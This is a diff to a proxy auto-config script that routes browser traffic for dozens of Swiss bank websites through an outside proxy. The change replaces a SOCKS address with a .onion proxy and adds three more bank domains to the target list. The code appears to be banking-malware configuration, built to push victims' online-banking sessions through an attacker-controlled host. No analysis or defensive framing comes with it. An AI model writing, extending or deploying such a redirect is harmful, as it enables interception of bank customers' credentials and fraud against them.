@@ -1,5 +1,5 @@
 function FindProxyForURL(url, host) {
-    var proxy = "SOCKS 31.41.44.226:88;";
+    var proxy = "PROXY xho7gzpqwnw7awoc.onion:88;";
     var hosts = new Array('*.postfinance.ch', 'cs.directnet.com', '*akb.ch',
         '*.ubs.com', 'tb.raiffeisendirect.ch', '*.bkb.ch', '*.lukb.ch',
         '*.zkb.ch', '*.onba.ch', '*gkb.ch', '*.bekb.ch', '*zugerkb.ch',
@@ -20,7 +20,8 @@ function FindProxyForURL(url, host) {
         '*aekbank.ch', '*acrevis.ch', '*credinvest.ch',
         '*bancazarattini.ch', '*appkb.ch', '*arabbank.ch', '*apbank.ch',
         '*notenstein-laroche.ch', '*bankbiz.ch', '*bankleerau.ch',
-        '*btv3banken.ch', '*dcbank.ch', '*bordier.com');
+        '*btv3banken.ch', '*dcbank.ch', '*bordier.com', '*banquethaler.com',
+        '*bankzimmerberg.ch', '*bbva.ch');
     for (var i = 0; i < hosts.length; i++) {
         if (shExpMatch(host, hosts[i])) {
             return proxy
